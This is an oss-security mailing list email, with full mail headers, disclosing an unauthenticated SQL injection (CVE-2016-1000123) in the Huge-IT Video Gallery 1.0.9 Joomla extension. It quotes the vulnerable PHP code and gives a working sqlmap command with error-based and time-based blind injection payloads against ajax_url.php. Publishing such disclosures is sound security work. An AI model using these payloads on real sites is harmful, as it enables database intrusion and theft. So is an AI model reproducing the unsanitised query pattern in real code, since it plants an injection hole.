X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3756" "Wednesday" "21" "September" "2016" "16:24:44" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<9DC1F462-75B5-4A12-80FB-C0924D1E89E5@me.com>" "90" "[oss-security] Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Joomla" nil nil nil "9" "2016092120:24:44" "[oss-security] Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Joomla" (number mark "U       larry0@me.co Sep 21   90/3756  " thread-indent "\"[oss-security] Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13472 invoked by uid 550); 21 Sep 2016 20:25:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13446 invoked from network); 21 Sep 2016 20:25:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1474489487; bh=melVtH61TFjiTtmUbHT48wMulYdYQqYs3rsLOmIiXP0=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=b4R62RglglPEaMyZojzig8k9+n3mlgPUvC8TuTbwYZVOwScFrXGanUXYOcuMxrUsd
 7TZcHLENhMvfOV+ALDk72XJu7r63kgJ7xH5pGNpKIz7E5J05QrYrsTr4UtMaiHaZrm
 g3By6mnMpWoiymesdwf1T+U65/5o1cQ8hvk0+KbzFKaqG0b4nUbErCvXHc1+Jcsj3r
 2mGqWZ3gvUESz8ARMtSKLiQ74wsbVwUwWID1Zqb6CjwCtIAFY511daqW2u4YKz9ZnJ
 r6NhMBlcUaRTOsiwE6Lc6YTUY3NyokfMODJT/nVDgORzWQWNq9Tz02wxuzjgvCmMKS
 BMsFx1qt74CpA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-09-21_10:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1603290000 definitions=main-1609210369
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <9DC1F462-75B5-4A12-80FB-C0924D1E89E5@me.com>
Date: Wed, 21 Sep 2016 16:24:44 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for
 Joomla

Title: Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Jo=
omla
Author: Larry W. Cashdollar, @_larry0
Date: 2016-09-15
Download Site: http://huge-it.com/joomla-video-gallery/
Vendor: www.huge-it.com, fixed v1.1.0
Vendor Notified: 2016-09-17
Vendor Contact: info@huge-it.com
Description: A video slideshow gallery.
Vulnerability:
The following code does not prevent an unauthenticated user from injecting =
SQL into functions located in ajax_url.php.=20

Vulnerable Code in : ajax_url.php

 11 define('_JEXEC',1);
 12 defined('_JEXEC') or die('Restircted access');
=2E
=2E
=2E
 28         if($_POST['task']=3D=3D"load_videos_content"){
 29=20
 30             $page =3D 1;
 31=20
 32=20
 33             if(!empty($_POST["page"]) && is_numeric($_POST['page']) && =
$_POST['page']>0){
 34                 $paramssld=3D'';
 35                 $db5 =3D JFactory::getDBO();
 36                 $query5 =3D $db->getQuery(true);
 37                 $query5->select('*');
 38                 $query5->from('#__huge_it_videogallery_params');
 39                 $db->setQuery($query5);
 40                 $options_params =3D $db5->loadObjectList();
 41                 foreach ($options_params as $rowpar) {
 42                     $key =3D $rowpar->name;
 43                     $value =3D $rowpar->value;
 44                     $paramssld[$key] =3D $value;
 45                 }
 46                 $page =3D $_POST["page"];
 47                 $num=3D$_POST['perpage'];
 48                 $start =3D $page * $num - $num;
 49                 $idofgallery=3D$_POST['galleryid'];
 50=20
 51                 $query =3D $db->getQuery(true);
 52                 $query->select('*');
 53                 $query->from('#__huge_it_videogallery_videos');
 54                 $query->where('videogallery_id =3D'.$idofgallery);
 55                 $query ->order('#__huge_it_videogallery_videos.ordering=
 asc');
 56                 $db->setQuery($query,$start,$num);

CVE-2016-1000123
Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/components/com_videogallerylite/=
ajax_url.php' --data=3D"page=3D1&galleryid=3D*&task=3Dload_videos_content&p=
erpage=3D20&linkbutton=3D2"  --level=3D5 --risk=3D3
	=E2=80=A2 .
	=E2=80=A2 .
	=E2=80=A2 .
	=E2=80=A2 (custom) POST parameter '#1*' is vulnerable. Do you want to keep=
 testing the others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 2870 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* ((custom) POST)
	=E2=80=A2     Type: error-based
	=E2=80=A2     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
	=E2=80=A2     Payload: page=3D1&galleryid=3D-3390 OR 1 GROUP BY CONCAT(0x7=
16b766271,(SELECT (CASE WHEN (2575=3D2575) THEN 1 ELSE 0 END)),0x7170767071=
,FLOOR(RAND(0)*2)) HAVING MIN(0)#&task=3Dload_videos_content&perpage=3D20&l=
inkbutton=3D2
	=E2=80=A2=20=20
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: page=3D1&galleryid=3D(CASE WHEN (5952=3D5952) THEN =
SLEEP(5) ELSE 5952 END)&task=3Dload_videos_content&perpage=3D20&linkbutton=
=3D2
	=E2=80=A2 ---
	=E2=80=A2 [19:36:55] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Debian 8.0 (jessie)
	=E2=80=A2 web application technology: Apache 2.4.10
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [19:36:55] [WARNING] HTTP error codes detected during run:
	=E2=80=A2 500 (Internal Server Error) - 2714 times
	=E2=80=A2 [19:36:55] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/192.168.0.4'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 19:36:55
Advisory: http://www.vapidlabs.com/advisory.php?v=3D169=
